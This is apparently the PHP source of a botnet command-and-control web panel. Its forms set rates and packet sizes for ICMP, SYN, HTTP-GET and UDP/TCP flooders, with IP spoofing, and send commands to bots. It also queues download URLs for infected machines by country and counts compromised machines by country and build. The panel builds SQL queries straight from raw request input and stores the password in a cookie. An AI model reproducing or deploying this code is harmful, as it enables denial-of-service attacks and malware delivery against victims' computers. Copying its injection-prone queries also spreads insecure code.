<?

	include "common.php";

	$luser = @$_POST['user'];
	$lpass = @$_POST['pass'];
	$login = @$_POST['login'];

	$logined = false;

	if ($login)
	{
    		Sleep(1);
    		if ($luser == $user && $lpass == $pass)
    		{
        		setcookie("logined", $pass);
        		header("location: index.php");
    		}
	} else {
    		$logined = @$_COOKIE['logined'];
    		if ($logined === $pass)
    		{
          		$logined = true;
    		}
	}

?>
<html>
<head>
<STYLE type=text/css>
BODY {
        BACKGROUND: #666666;
        FONT: 11px Verdana, Arial
}
P {
        FONT: 10pt Verdana, Arial;
        COLOR: #000000;
        TEXT-ALIGN: justify
}
TD {
        FONT: 8pt Verdana,Arial;
        COLOR: #000000
}
A {
        COLOR: #000000;
        TEXT-DECORATION: underline
}
A.nav {
        COLOR: #000000; TEXT-DECORATION: none
}
A:hover {
        BACKGROUND: silver; TEXT-DECORATION: underline overline
}
INPUT, SELECT, TEXTAREA {
        FONT-SIZE: 8pt; FONT-FAMILY: Verdana, Helvetica;
        border: 1px solid silver;
        color: #606060;
        background-color: #222222;
        margin-top: 0px;
        margin-bottom: 0px;
}
.HEAD TD {
       BACKGROUND: silver; TEXT-ALIGN: center; FONT-WEIGHT: bold
}
.SLIST TD {
        BACKGROUND: #888888
}
</STYLE>
</head>
<body>

<script>
function wnd( url )
{
        window.open( url, "", "statusbar=no,menubar=no,toolbar=no,scrollbars=yes,resizable=no,width=600,height=400");
}
</script>

<?

    	if (!$logined)
    	{

?>

<form action=index.php method=POST>
<table>
<tr><td>user:</td><td><input type=text name=user></td></tr>
<tr><td>pass:</td><td><input type=password name=pass></td></tr>
<tr><td></td><td><input type=submit name=login value=login></td></tr>
</table>
</form>

<?
        	exit;
	}

	switch (@$_GET['d'])
	{
	case "add":
        	if (empty($_POST['url']))
			break;

        	if (isset($_POST['country'])) $_POST['country'] = strtoupper($_POST['country']);

        	$sql = "INSERT INTO `files`
                	(`url`, `dnum`, `country`)
                	VALUES
                	('{$_POST['url']}', '".intval($_POST['dnum'])."', '{$_POST['country']}')
        	";

        	mysql_query($sql);
        	header ("location: index.php");
        	break;

	case "del":
        	if (!isset($_GET['id']))
            		break;
        
		$sql = "DELETE FROM `files` WHERE `id`='{$_GET['id']}'";
        	mysql_query($sql);
        	header ("location: index.php");
        	break;
	}
	
	if (isset($_POST['opt']))
	{
		if (!isset($_POST['opt']['spoof_ip']))
			$_POST['opt']['spoof_ip'] = 0;

		foreach (array_keys($_POST['opt']) as $k)
			mysql_query("REPLACE INTO `opt` (`name`, `value`) VALUES ('$k', '{$_POST['opt'][$k]}')");

		header("location: index.php");
	}

	$bopt = array();

	$r = mysql_query("SELECT * FROM `opt`");
	while ($f = mysql_fetch_array($r))
		$bopt[$f['name']] = $f['value'];

?>

<form action='index.php' method='POST'>
<table callspacing='0'>
<tr><td colspan='2'><b>Flooders options</b><td></tr>
<tr><td colspan='2'>ICMP flooder<td></tr>
<tr>
<td align='right' width='120'>freq:</td>
<td><input type='text' name='opt[icmp_freq]' value='<?=$bopt['icmp_freq']?>' size=7></td>
</tr>
<tr>
<td align='right' width='120'>packetsize:</td>
<td><input type='text' name='opt[icmp_size]' value='<?=$bopt['icmp_size']?>' size=7></td>
</tr>
<tr><td colspan='2'>SYN flooder<td></tr>
<tr>
<td align='right' width='120'>freq:</td>
<td><input type='text' name='opt[syn_freq]' value='<?=$bopt['syn_freq']?>' size=7></td>
</tr>
<tr><td colspan='2'>HTTP-GET flooder<td></tr>
<tr>
<td align='right' width='120'>freq:</td>
<td><input type='text' name='opt[http_freq]' value='<?=$bopt['http_freq']?>' size=7></td>
</tr>
<tr>
<td align='right' width='120'>threads:</td>
<td><input type='text' name='opt[http_threads]' value='<?=$bopt['http_threads']?>' size=7></td>
</tr>
<tr><td colspan='2'>UDP and TCP/UDP data flooders<td></tr>
<tr>
<td align='right' width='120'>UDP/TCP freq:</td>
<td><input type='text' name='opt[tcpudp_freq]' value='<?=$bopt['tcpudp_freq']?>' size=7></td>
</tr>
<tr>
<td align='right' width='120'>UDP size:</td>
<td><input type='text' name='opt[udp_size]' value='<?=$bopt['udp_size']?>' size=7></td>
</tr>
<tr>
<td align='right' width='120'>TCP size:</td>
<td><input type='text' name='opt[tcp_size]' value='<?=$bopt['tcp_size']?>' size=7></td>
</tr>
<tr><td colspan='2'><b>Advanced SYN and ICMP options</b><td></tr>
<tr>
<td align='right' width='120'>spoof sender IP:</td>
<td><input type='checkbox' name='opt[spoof_ip]' value='1' <?=$bopt['spoof_ip']?'checked':''?>></td>
</tr>
<tr><td colspan='2'><td></tr>
<tr><td colspan='2'><b>Command</b> [ <a href="javascript:wnd('cmdhelp.html')">help</a> ]<td></tr>
<tr><td colspan='2'><input type='text' name='opt[cmd]' value='<?=$bopt['cmd']?>' size=33><td></tr>
<tr><td align="right">refresh rate:</td><td><input type='text' name='opt[ufreq]' value='<?=$bopt['ufreq']?>' size=7> (in minutes)</td></tr>
<tr><td></td><td><input type='submit' value='submit'></td></tr>
</table>
</form>

<b>Downloader</b>
<?

	$sql = "SELECT * FROM `files`";
	$r = mysql_query($sql);

	echo "<table cellspacing='1'>";

	if (mysql_num_rows($r) > 0)
		echo "<tr height='20' class='head'><td>url</td><td>downloads</td><td>downloaded</td><td>for country</td><td>delete</td></tr>";

	while ($f = mysql_fetch_array($r))
	{
		if (!empty($f['country']))
		{
			$flag = "flags/".strtolower($f['country']).".gif";
			if (!file_exists($flag)) $flag = "flags/00.gif";
			$f['country'] = "<img src=$flag> {$f['country']}";
        } else {
			$f['country'] = "for all";
        }

		echo 	"<tr class='slist'><td>{$f['url']}</td><td align='center'>".($f['dnum']=='0'?'-':$f['dnum'])."</td>".
             		"<td align='center'>{$f['dtotal']}</td><td align='center'>{$f['country']}</td><td>[ <a href=index.php?d=del&id={$f['id']}>delete</a> ]</td></tr>";
	}

	echo "</table>";

?>

<form action=index.php?d=add method="POST" id="addFrm">
<table>
<tr><td align="right" width='120'>url:</td><td><input type="text" name="url" size="30"></td></tr>
<tr><td align="right" width='120'>downloads:</td><td><input type="text" name="dnum" size="7"> (0 for unlimited)</td></tr>
<tr><td align="right" width='120'>for country:</td><td><input type="text" name="country" size="7"> (empty - for all countries, othervise input country ID)</td></tr>
<tr><td></td><td><input type="submit" value="add"></td></tr>
</table>
</form>

<?

	$sql = "SELECT `id` FROM `stat` WHERE ".time()."-`last`<".$opt['timeout']*60;
	$r = mysql_query($sql);
	$total = mysql_num_rows($r);

	$sql = "SELECT `id` FROM `stat` WHERE ".time()."-`last`<".(60*60*24);
	$r = mysql_query($sql);
	$day = mysql_num_rows($r);

	$sql = "SELECT `id` FROM `stat`";
	$r = mysql_query($sql);
	$all = mysql_num_rows($r);

	$sql = "SELECT *, COUNT(*) AS `cnt` FROM `stat` WHERE ".time()."-`last`<".($opt['timeout']*60)." GROUP BY `country` ORDER BY `cnt` DESC";
	$r = mysql_query($sql);

?>

statistic by countries:<br>
<table cellspacing='1'>
<tr class='slist'>
<td colspan=3>
<table>
<tr><td align='right'>machines online:</td><td><b><?=$total ?></b></td></tr> 
<tr><td align='right'>for day:</td><td><b><?=$day ?></b></td></tr>
<tr><td align='right'>for all time:</td><td><b><?=$all ?></b></td></tr> 
<tr><td align='right'>countries:</td><td><b><?=mysql_num_rows($r) ?></b></td></tr>
</table>
</td>
</tr>

<?
	if (mysql_num_rows($r) > 0)
		echo "<tr height='20' class='head'><td>country</td><td>number of machines</td></tr>";

	while ($f = mysql_fetch_array($r))
	{
        	$flag = "flags/".strtolower($f['country']).".gif";
        	if (!file_exists($flag)) $flag = "flags/00.gif";
        	if ($f['country'] == '00')
             		echo "<tr class='slist'><td><img src=$flag> unknown</td><td align=center>{$f['cnt']}</td></tr>";
        	else 	echo "<tr class='slist'><td><img src=$flag> ({$f['country']}) {$f['country_full']}</td><td align=center>{$f['cnt']}</td></tr>";
	}

	echo "</table>";


	$sql = "SELECT *, COUNT(*) AS `cnt` FROM `stat` WHERE ".time()."-`last`<".($opt['timeout']*60)." GROUP BY `build_id`";
	$r = mysql_query($sql);

	echo "<br>statistic by builds:<br><table cellspacing='1'><tr class='slist'><td colspan=3>builds: <b>".mysql_num_rows($r)."</b>;</td></tr>";

	if (mysql_num_rows($r) > 0)
		echo "<tr height='20' class='head'><td>build ID</td><td>number of machines</td></tr>";

	while ($f = mysql_fetch_array($r))
	{
        	echo "<tr class='slist'><td>{$f['build_id']}</td><td align=center>{$f['cnt']}</td></tr>";
	}

	echo "</table>";

?>

</body>
</html>